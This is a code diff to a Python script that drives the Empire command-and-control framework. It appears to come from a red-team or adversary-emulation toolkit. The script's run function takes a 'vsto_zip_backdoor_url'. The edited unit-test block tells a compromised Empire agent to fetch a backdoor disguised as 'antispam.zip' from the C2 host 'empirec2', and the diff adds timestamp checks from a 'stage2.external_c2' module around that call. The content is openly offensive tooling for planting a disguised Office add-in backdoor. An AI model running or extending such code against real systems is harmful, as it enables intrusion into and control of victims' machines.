@@ -88,4 +88,8 @@ def run(API, agent_name, vsto_zip_backdoor_url):
 
 if __name__ == '__main__': # unit test
     API = empireAPI(EMPIRE_SERVER, uname=EMPIRE_USER, passwd=EMPIRE_PWD)
-    print(run(API, API.agents()['agents'][0]['name'], 'http://empirec2:8000/antispam.zip'))
+    agent = API.agents()['agents'][0]['name']
+    from stage2.external_c2 import empire_get_timestamp
+    print(empire_get_timestamp.run(API,agent))
+    print(run(API, agent, 'http://empirec2:8000/antispam.zip'))
+    print(empire_get_timestamp.run(API,agent))
